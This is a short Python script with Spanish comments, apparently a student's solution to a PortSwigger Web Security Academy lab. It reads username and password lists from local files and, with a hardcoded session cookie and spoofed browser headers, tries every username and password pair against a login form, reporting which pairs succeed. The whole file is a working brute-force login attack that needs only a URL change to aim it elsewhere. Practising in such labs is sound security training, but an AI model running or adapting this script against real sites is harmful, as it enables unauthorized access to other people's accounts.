#Autor: Sebastian Cordoba Ibarguen
#Fecha: 28/02/2024

# Inicializar un diccionario para almacenar las palabras

# Inicializar una lista para almacenar las palabras
lista_contrasenias = []


import requests

# Abrir el archivo en modo lectura
with open('passwords_db.txt', 'r') as contrasenias:
    # Leer el contenido del archivo línea por línea
    for linea in contrasenias:
        # Separar la línea en palabras
        palabras = linea.split()
        
        for palabra in palabras:
            
            # Para la lista, simplemente agrega las palabras
            lista_contrasenias.append(palabra)

# Mostrar la lista resultante
#print("Lista de contrasenias:", lista_contrasenias, '\n' )
print('')
print('')
print('')




lista_usuarios = []

with open('usuarios_noborrar.txt', 'r') as usuarios:
    for linea in usuarios:
        # Separar la línea en palabras
        palabras = linea.split()
        

        for palabra in palabras:
             lista_usuarios.append(palabra)



#print("Lista de usuarios:", lista_usuarios)



cookieActual = {
"session": "7Uma0WC8AWU4jqdgdfc8xEXUPB2zx3ie"
}

#"rZPOP58RdEfOkvfz6BTer9HTQV8z73v3"




login_url ="https://0abb00bb04f933ff83e2fa1a004a0038.web-security-academy.net/login"

headersAPP = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://0abb00bb04f933ff83e2fa1a004a0038.web-security-academy.net',
    'Referer': 'https://0abb00bb04f933ff83e2fa1a004a0038.web-security-academy.net/login',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers'
}





for usuario in lista_usuarios:
    for contrasenia in lista_contrasenias:
         credencials = {'username': usuario, 'password': contrasenia}
         response = requests.post(url=login_url, data=credencials, headers=headersAPP, cookies=cookieActual)
         
         if response.status_code == 200 and 'Welcome to the Web Security Academy' in response.text:
            print(f'Inicio de sesión exitoso para {usuario}:{contrasenia}')

         else:
            print(f'Inicio de sesión fallido para {usuario}:{contrasenia}. Código de estado:', response.status_code)


